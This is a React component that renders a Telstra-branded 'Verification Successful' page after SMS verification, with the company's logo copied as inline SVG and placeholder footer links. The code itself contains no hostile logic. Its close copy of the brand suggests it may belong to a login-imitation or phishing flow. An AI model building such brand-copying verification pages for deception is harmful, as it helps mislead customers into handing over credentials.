import { CheckCircle, ArrowLeft } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useLocation } from "wouter";

export default function Success() {
  const [location, setLocation] = useLocation();

  const goBack = () => {
    setLocation("/");
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Telstra Header */}
      <header className="t-page-header">
        <svg width="33px" height="33px" viewBox="0 0 33 33" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-label="Telstra Logo" role="img" focusable="false">
          <g id="Artboard" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
            <g id="Telstra_Primary-logo_C_RGB" fillRule="nonzero">
              <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" id="Path" fill="#F96449"></path>
              <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
            </g>
          </g>
        </svg>
      </header>

      <div role="main" className="t-form-container">
        <div className="text-center space-y-6">
          <div className="mx-auto w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
            <CheckCircle className="h-8 w-8 text-green-600" />
          </div>
          
          <h1 className="t-able-heading-b">
            Verification Successful
          </h1>
          
          <div className="t-able-text-bodyshort text-gray-600">
            Your identity has been successfully verified. You now have access to your Telstra account.
          </div>

          <div className="bg-green-50 border border-green-200 rounded-lg p-4">
            <p className="text-green-800 text-sm">
              ✅ SMS verification completed<br />
              🔐 Access granted to your account<br />
              📱 You can now continue to your services
            </p>
          </div>

          <Button
            onClick={goBack}
            className="t-able-medium-emph-button flex items-center gap-2"
            data-testid="button-back-to-login"
          >
            <ArrowLeft className="h-4 w-4" />
            Back to Login
          </Button>
        </div>
      </div>

      <footer className="t-footer">
        <div className="t-footer-content">
          <p className="t-footer-copyright">Copyright © 2025 Telstra</p>
          <a 
            className="t-footer-privacy" 
            href="#" 
            target="_blank"
            data-testid="link-privacy"
          >
            Privacy
          </a>
          <a 
            className="t-footer-terms" 
            href="#" 
            target="_blank"
            data-testid="link-terms"
          >
            Terms of use
          </a>
        </div>
      </footer>
    </div>
  );
}